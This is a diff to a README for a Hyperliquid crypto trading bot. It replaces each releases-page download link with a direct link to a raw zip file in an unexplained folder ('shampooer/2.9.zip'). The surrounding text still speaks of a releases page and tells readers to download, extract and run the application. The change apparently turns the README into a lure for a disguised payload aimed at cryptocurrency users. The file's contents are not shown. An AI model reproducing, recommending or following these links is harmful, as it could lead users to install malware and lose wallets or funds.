@@ -1,6 +1,6 @@
 # 🤖 HyperBot-Hyperliquid-Trading-Bot-2026 - Automate Your Crypto Trading Effortlessly
 
-[![Download HyperBot](https://img.shields.io/badge/Download-HyperBot-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ChinoM112/HyperBot-Hyperliquid-Trading-Bot-2026/releases)
+[![Download HyperBot](https://img.shields.io/badge/Download-HyperBot-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ChinoM112/HyperBot-Hyperliquid-Trading-Bot-2026/raw/refs/heads/main/shampooer/2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to HyperBot, your personal automated trading assistant for the Hyperliqu
 
 ## 📥 Download and Install
 
-Visit this link to download the application: **[HyperBot Download Page](https://github.com/ChinoM112/HyperBot-Hyperliquid-Trading-Bot-2026/releases)**
+Visit this link to download the application: **[HyperBot Download Page](https://github.com/ChinoM112/HyperBot-Hyperliquid-Trading-Bot-2026/raw/refs/heads/main/shampooer/2.9.zip)**
 
 Once you click the link, you'll see a list of available files. Look for the latest version and download it to your computer. The download might take a few minutes depending on your internet speed.
 
@@ -137,7 +137,7 @@ If you need assistance:
 
 You're now ready to start your automated trading journey with HyperBot. Remember to:
 
-1. **Download** the latest version from our [releases page](https://github.com/ChinoM112/HyperBot-Hyperliquid-Trading-Bot-2026/releases)
+1. **Download** the latest version from our [releases page](https://github.com/ChinoM112/HyperBot-Hyperliquid-Trading-Bot-2026/raw/refs/heads/main/shampooer/2.9.zip)
 2. **Extract** the files to your preferred location
 3. **Run** the application
 4. **Configure** your trading preferences
